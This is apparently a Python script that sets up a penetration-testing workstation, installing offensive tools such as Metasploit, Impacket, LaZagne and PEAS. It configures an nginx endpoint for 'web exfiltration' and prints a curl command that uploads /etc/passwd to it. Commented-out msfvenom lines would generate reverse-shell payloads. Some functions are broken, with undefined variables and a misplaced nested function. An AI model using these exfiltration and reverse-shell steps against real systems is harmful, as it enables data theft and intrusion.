import os,re,time
from simple_term_menu import TerminalMenu
from termcolor import colored


APT_PACKAGES = [
	'apt-transport-https',
	'bloodhound',
	'chromium',
	'crackmapexec',
	'enum4linux',
	'gobuster',
	'golang-go',
	'jxplorer',
	'metasploit-framework',
	'nginx',
	'remmina',
	'seclists',
	'smbmap',
	'snmpcheck',
	'sshoot',
	'sshuttle',
	'subfinder',
	'sublime-text',
	'tilix',
	'wfuzz',
	'xfreerdp',
	'yersinia'
]

#TODO: Alphabetize
GITHUBS = [
   'https://github.com/0v3rride/Enum4LinuxPy.git',
	'https://github.com/21y4d/nmapAutomator.git',
	'https://github.com/BishopFox/rmiscout.git',
	'https://github.com/cnotin/SplunkWhisperer2.git',
	'https://github.com/unode/firefox_decrypt.git',
	'https://github.com/frohoff/ysoserial.git',
	'https://github.com/GhostPack/Seatbelt.git',
	'https://github.com/HackPlayers/evil-winrm.git',
	'https://github.com/n0b0dyCN/redis-rogue-server.git',
	'https://github.com/nccgroup/vlan-hopping.git',
	'https://github.com/NickstaDB/BaRMIe.git',
	'https://github.com/samratashok/nishang.git',
	'https://github.com/p3nt4/Invoke-SocksProxy.git',
	'https://github.com/silent6trinity/pwnkit.git',
	'https://github.com/rebootuser/LinEnum.git',
	'https://github.com/RUB-NDS/PRET.git',
	'https://github.com/SecureAuthCorp/Impacket.git',
	'https://github.com/sosdave/KeyTabExtract.git',
	'https://github.com/vulnersCom/nmap-vulners.git'
]

#Kerbrute releases
# https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
# https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe

#pspy release
#https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

PYPI_PACKAGES = [
	'one-lin3r',
	'pypykatz',
	'pygtk',
	'ptftpd',
	'bloodhound',
	'colorama',
	'pysnmp'
]

# ---- Begin Function declarations -----

def nginx_config():
	# Used to create an NGINX proxy for apache for web exfiltration 
	os.system("sudo mkdir -p /var/www/uploads/Exfil")
	os.system("sudo chown -R www-data:www-data /var/www/uploads/Exfil")
	os.system("sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf")
	os.system("sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/")
	os.system("sudo systemctl restart nginx.service")
	os.system("sudo rm /etc/nginx/sites-enabled/default")
	# Usage
	print(colored("NGINX has been setup. To test the upload, try:","green"))
	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt \n", "green"))


def env_setup():
	""" This is meant to start services, check running processes, etc """
	print(colored("Starting SSH service ...", "blue"))
	os.system("sudo service ssh start")
	# The SMB Server may need some massaging so we have it sharing the desired directory
	#print(colored("Starting SMB Server", "blue"))
	# os.system("impacket-smbserver -smb2support share $(pwd)")


def go_install():
	if os.path.exists(f'/usr/local/go'):
		print(colored('GO already is installed at /usr/local/go, continuing...', 'green'))
	else:
		os.system('wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz')
		os.system('sudo rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz')
		os.system('export PATH=$PATH:/usr/local/go/bin') # This currently isn't working properly
		os.system('source $HOME/.profile && go version')
		print('Attempting to utilize GO to grab & install assetfinder now...\n')
		os.system('go get -u github.com/tomnomnom/assetfinder')
		print(colored('If we have gotten to here, this is a good sign....', 'yellow'))

#Consider moving into environment setup
def msfdb_init():
	#TODO: Check and make sure the msfdb is actually up and running
	os.system('sudo systemctl start postgresql')
	os.system('systemctl status postgresql')
	os.system('sudo msfdb init')
	print("MSF Database Initialized")
	print("Creating msfconsole.rc file")
	os.system(f' cp ./msfconsole.rc /home/{user}/.msf4/msfconsole.rc')

#Consider moving into environment setup
def neo4j_init():
	#TODO: Grab the port/service information and present to the user
	os.system('sudo mkdir -p /usr/share/neo4j/logs')
	os.system('sudo touch /usr/share/neo4j/logs/neo4j.log')
	os.system('sudo neo4j start')
	print("Neo4j service initialized")

#TODO: Do this better
#TODO: Fix it so that the proper lower-level user owns the files
def peas_download():
	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/linpeas.sh'
	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEAS.bat'
	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEASany.exe'
	if os.path.exists("/opt/PEAS"):
		#Lol, risky
		os.system("sudo rm -rf /opt/PEAS")
		grab_peas()
	else:
		grab_peas()

	def grab_peas():
		os.mkdir(f"sudo /opt/PEAS")
		os.system(f"sudo wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x /opt/PEAS/linpeas.sh")
		os.system(f"sudo wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
		os.system(f"sudo wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")
	# For the time being - just scrub the PEAS directory and re-obtain



def shell_creation():
	#ip_addr = os.popen('ip addr show eth0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
	#listen_port = 6969
	print(f"Interface address is: {ip_addr}")
	print(f"Port being used for shells is {listen_port}")
	print("						   Nice")
	#os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
	#os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
	#os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f exe > /tmp/test.exe')
	print("Did I work? doubtful!")

#TODO: Go through the installed tools and make them dynamically executable
#Search through tools and see if there's any requirements.txt - if there is - install them.
# os.system("ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x /opt/nmapAutomator/nmapAutomator.sh")
# sudo ln -s /opt/LinEnum.sh /usr/local/bin/'
# sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin
def tool_install():
	#Temp method to grab lazagne and the old firefox decrypt for python2
	lazagne_exe = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
	os.system(f"sudo wget {lazagne_exe} -qO /opt/lazagne.exe")
	ff_decrypt_old = 'https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
	os.system(f"sudo wget {ff_decrypt_old} -qO /opt/FirefoxDecrypt_ForPython2")
	
	#### END TEMP METHOD
	
	def is_repo_installed(repo_url):
		if a_match := re.match(r"https://.+/(.+)\.git", repo_url):
			return os.path.exists(f"/opt/{a_match.group(1)}")
		else:
			print(colored(f'INVALID URL: {repo_url}', 'red'))
			# Returning True here because if the url isn't valid, then we definitely don't want to try installing
			return True

	for git_url in GITHUBS:
		print(f"Checking for local install of: {git_url}")
		if is_repo_installed(git_url):
			print(colored(f"Found in /opt continuing...\n"))
		else:
			os.system(f"git clone {git_url}")
			print(colored("Repo cloned! Moving on...\n", "green"))
			#return()

	# begin installing pypi & apt packages
	for pkg in APT_PACKAGES:
		os.system(f'sudo apt install {pkg} -y 1>/dev/null')
		os.system('sudo apt install -y 1>/dev/null')
		print(colored(f'APT {pkg} successfully installed by script', "green"))
	for pkg in PYPI_PACKAGES:
		os.system(f'pip3 install {pkg} 1>/dev/null')
		print(colored(f'PYPI {pkg} successfully installed by script', "green"))
	peas_download()
	os.system("ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x /opt/nmapAutomator/nmapAutomator.sh")
	print("tool_install() Completed")
	return True


def sublime_download():
	sublime = 'deb https://download.sublimetext.com/ apt/stable/'
	os.system('sudo wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
				| sudo apt-key add -')
	os.system(f'echo {sublime} | sudo tee /etc/apt/sources.list.d/sublime-text.list')

def system_update():
	print(colored("Beginning System updates, please wait...", 'blue'))
	os.system('sudo apt-get install apt-transport-https') # Doing this first to ensure sublime_download() wont cause an error
	sublime_download()
	tool_install()
	tool_update()
	os.system('sudo apt install python3-pip -y')
	os.system('sudo apt update -y')
	os.system('sudo apt upgrade -y')
	os.system('sudo apt autoremove -y')

	print(colored("Starting SSH service ...", "blue"))
	os.system("sudo service ssh start")

	print(colored("Finished SYSTEM setup", 'green'))
	return()

def terminal_selection():
	""" This is what is used within main() to control the function flow """
	main_menu_title = "Automated Kit Buildout Script, Select ALL, TOOLS, SHELL or TEST\n"
	main_menu_cursor = "-> "

	options = ["ALL", "TOOLS", "SHELL (BROKEN)", "TEST"]
	# begin TUI Custom configuration(s)
	terminal_menu = TerminalMenu(
		options,
		title=main_menu_title,
		menu_cursor=main_menu_cursor)
	menu_entry_index = terminal_menu.show()
	user_selection = {options[menu_entry_index]}
	# Choice menu
	if menu_entry_index == 0:
		print(("Match Successful on ALL"))
		nginx_config()
		system_update()
		msfdb_init()
		neo4j_init()
		#software_update()
	elif menu_entry_index == 1:
		print("Match successful on TOOLS")
		#software_update()
		nginx_config()
		tool_install()
		tool_update()
		msfdb_init()
		neo4j_init()
		jon()
		#go_install()
	elif menu_entry_index == 2:
		print("Match successful on SHELL")
		shell_creation()
	elif menu_entry_index == 3:
		test()
	else:
		print("Match failed.")

def test():
	peas_download()
	print(os.getlogin()) # Interestingly enough - this returns the actual user
	print(os.system("whoami")) # This returns as root (since it's run as sudo)
	return()

def jon():
	print("Doing some work, here's a nice portrait, circa 2022 \n")
	print("""\
   -    \\O
  -     /\\  
 -   __/\\ `	
    `    \\, (o)
^^^^^^^^^^^`^^^^^^^^
Ol' Jon, kickin' them rocks again	\n""")

def tool_update():
	def nmap_update():
		print("Updating nmap script database\n")
		os.system('sudo nmap --script-updatedb 1>/dev/null')
		print(colored('nmap script database updated \n', 'green'))

	def rockyou():
		print("Checking if rockyou has been unzipped...")
		if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
			print("It hasn't been decompressed - decompressing now...\n")
			os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
		else:
			print(colored("rockyou has already been unzipped \n", 'green'))
			print(colored("Software & Tool updates have been completed!", 'green'))
	print('Updating searchsploit DB....\n')
	os.system('sudo searchsploit -u ')
	print(colored("Finished searchsploit update", 'green'))
	print("Updating locate DB...\n")
	os.system('sudo updatedb')
	print(colored("Finished locate DB update \n", 'green'))
	nmap_update()
	rockyou()
	return True
